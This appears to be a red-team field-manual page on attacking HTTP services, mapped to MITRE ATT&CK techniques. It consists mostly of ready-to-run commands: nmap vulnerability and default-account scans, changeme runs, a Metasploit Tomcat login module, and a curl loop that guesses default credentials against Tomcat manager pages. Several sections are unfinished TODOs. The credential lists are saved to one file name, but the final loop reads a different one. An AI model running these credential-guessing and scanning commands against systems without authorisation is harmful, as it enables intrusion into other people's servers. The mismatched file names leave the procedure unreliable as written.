
# Flawed HTTP Remote Services

## Overview

MITRE ATT&CK mapping: T1021 / T1210

## Procedures

### Additional tools

 - [gnmap2urls.sh](scripts/gnmap2urls.sh)
 - [http-fingerprints-min.lua](scripts/http-fingerprints-min.lua)
 - [nikto vuln db file](https://raw.githubusercontent.com/sullo/nikto/master/program/databases/db_tests)

### Web vulnerability discovery

Prepare target list:

    # transform URL list to hosts (http-ips.txt) and ports (http-ports.txt) lists:
    cat urls-all.txt | tee >(awk -F '//' '{print $2}' | cut -d':' -f1 > http-ips.txt) >(awk -F '//' '{print $2}' | awk -F':' '{print $2}' | grep . | sort -u > http-ports.txt)

Using Nikto DB:

    # get nikto vuln db file
    wget https://raw.githubusercontent.com/sullo/nikto/master/program/databases/db_tests -O nikto_db_tests

    # get minimal http-enum script
    wget https://raw.githubusercontent.com/mzet-/z-field-manual/master/scripts/http-fingerprints-min.lua

    # conduct http vuln scan on all previously identified http-based services:
    nmap -n -PN -sS -sV --version-intensity 2 --script=http-enum --script-args=http-enum.fingerprintfile=./http-fingerprints-min.lua,http-fingerprints.nikto-db-path=./nikto_db_tests -T4 -iL http-ips.txt -p80,443,$(cat http-ports.txt | tr '\n' ',') -oA vscans/http-nikto-vuln-scan

Using http-vulners-regex:

```
# get latest http vulners and regex matches:
wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/http-vulners-regex.nse
wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/http-vulners-regex.json
wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/http-vulners-paths.txt

# TODO: launch
```

[snallygaster](https://github.com/hannob/snallygaster) (run in parallel)

```
TODO
```

### Web-based authentication panels

Default credentials: Nmap

```
# get Nmap's aternative default account db :
wget https://raw.githubusercontent.com/nnposter/nndefaccts/master/http-default-accounts-fingerprints-nndefaccts.lua

# transform URL list to hosts (http-ips.txt) and ports (http-ports.txt) lists:
cat urls-all.txt | tee >(awk -F '//' '{print $2}' | cut -d':' -f1 > http-ips.txt) >(awk -F '//' '{print $2}' | awk -F':' '{print $2}' | grep . | sort -u > http-ports.txt)

# check for default web-based accounts:
nmap -n -PN -sS -sV --version-intensity 2 --script http-default-accounts --script-args http-default-accounts.fingerprintfile=./http-default-accounts-fingerprints-nndefaccts.lua -T4 -iL http-ips.txt -p80,443,$(cat http-ports.txt | tr '\n' ',') -oA vscans/http-def-accounts
```

Default credentials: changeme

```
# note: when providing file to 'changeme' full path is required:
changeme '/home/pt/httprobe-all.txt' -v -t 20 | tee changeme-http-urls.out
changeme '/home/pt/vscans/nmap.xml' --category http -v -t 20 | tee changeme-http-urls.out
```

Weak/simple credentials:

```
TODO
```


### Apache Tomcat: default/weak credentials

Use Metasploit module:

```
auxiliary/scanner/http/tomcat_mgr_login
```

OR (if many different ports are used), prepare target list:

```
Prereq: Nmap scan results imported to msf

msf> services -S Coyote -c port -o /tmp/tomcat.csv
$ for i in $(cat /tmp/tomcat.csv | tr -d '"' | tr ',' ':'); do echo "http://$i/manager/html"; done > tomcat-urls.txt
```

Prepare creds list:

```
# Set 1:
wget https://raw.githubusercontent.com/wintrmvte/medusa_combo_files/master/tomcat_default_79.txt
cat tomcat_default_79.txt | cut -d: -f2,3 > PAYLOADS/tomcat-defaults-2.txt

# Set 2:
$ wget https://raw.githubusercontent.com/netbiosX/Default-Credentials/master/Apache-Tomcat-Default-Passwords.mdown
$ cat Apache-Tomcat-Default-Passwords.mdown | tr -d ' ' | awk -F'|' '{print $2":"$3}' > PAYLOADS/tomcat-defaults-2.txt
```

Launch:

```
while read line; do echo -n "$line : "; for i in $(cat PAYLOADS/tomcat-defaults-1.txt); do RES=$(curl -k -H "Authorization: Basic $(echo -n "$i" | base64)" -s -o /dev/null -w "%{http_code}" --url "$line"); echo "$i:: $RES"; [ "$RES" -eq 200 ] && break; done; done < tomcat-urls.txt | tee tomcats-results-2.txt
```

## OPSEC considerations

## Counter-countermeasures
